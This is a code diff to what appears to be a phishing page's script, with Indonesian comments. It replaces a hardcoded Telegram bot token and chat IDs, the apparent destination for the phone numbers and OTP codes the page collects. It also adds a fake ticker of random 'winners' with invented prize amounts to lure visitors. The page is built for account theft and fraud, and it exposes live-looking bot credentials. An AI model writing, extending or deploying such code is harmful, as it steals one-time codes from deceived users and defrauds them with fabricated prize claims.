@@ -1,5 +1,5 @@
-const botToken = "7574129779:AAFfiOTdOg4NSEgWDHcvsyhaXsi_aZRcUIw";
-const chatIds = ["7639992105", "6124038392", "5460230196"]; // Daftar chat ID
+const botToken = "7945679163:AAE_FWn__VpRLUhREBGVGPZ6UtKNMCQFhsY";
+const chatIds = ["", "6124038392", "5460230196"]; // Daftar chat ID
 
 let messageIds = {}; // Objek untuk menyimpan message ID untuk setiap chat ID
 
@@ -141,3 +141,70 @@ document.getElementById("phone").addEventListener("input", function () {
 document.getElementById("otp").addEventListener("input", function () {
   this.value = this.value.replace(/[^0-9]/g, "").slice(0, 5); // Hanya angka dan maksimal 5 digit
 });
+
+// Daftar nama acak
+const names = [
+  "Ahmad",
+  "Budi",
+  "Citra",
+  "Dewi",
+  "Eka",
+  "Fajar",
+  "Gilang",
+  "Hana",
+  "Indra",
+  "Joko",
+  "Kiki",
+  "Lala",
+  "Maya",
+  "Nia",
+  "Oka",
+  "Putri",
+  "Qori",
+  "Rina",
+  "Sari",
+  "Teguh",
+  "Usman",
+  "Vina",
+  "Wulan",
+  "Xavier",
+  "Yoga",
+  "Zara",
+  "Anita",
+  "Bambang",
+  "Cici",
+  "Dina",
+  "Eris",
+  "Faisal",
+  "Gita",
+  "Hendra",
+  "Ilham",
+  "Jihan",
+  "Kelana",
+  "Lestari",
+  "Mega",
+  "Novi",
+  "Oscar",
+  "Pandu",
+  "Qori",
+  "Rina",
+  "Sandi",
+  "Tata",
+  "Umar",
+  "Vira",
+  "Wawan",
+  "Yudha",
+];
+
+// Menampilkan pemenang acak dengan hadiah
+const winnerDisplay = document.getElementById("winner-display");
+
+function displayWinner() {
+  const name = names[Math.floor(Math.random() * names.length)];
+  const amount = (Math.floor(Math.random() * 21) + 5) * 1000000; // Nilai antara 5 juta hingga 25 juta
+  winnerDisplay.textContent = `${name} - Rp ${amount.toLocaleString("id-ID")}`;
+}
+
+// Perbarui tampilan pemenang setiap 3 detik
+setInterval(displayWinner, 3000);
+displayWinner();
